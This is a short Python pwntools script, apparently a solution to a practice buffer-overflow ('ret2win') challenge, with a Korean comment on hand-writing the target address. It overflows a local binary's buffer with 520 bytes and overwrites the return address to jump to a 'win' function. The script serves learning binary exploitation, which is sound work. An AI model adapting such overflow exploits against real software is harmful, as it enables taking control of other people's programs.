#!/usr/bin/env python3
from pwn import *

p = process("./bof_ret2win")

# GDB: p/x &win  ->  0x401156
# 0x0000000000401156을 8바이트 little endian으로 직접 작성
win = b"\x56\x11\x40\x00\x00\x00\x00\x00"

payload = b"A" * 520
payload += win

p.sendafter(b"Send payload:\n", payload)
p.interactive()
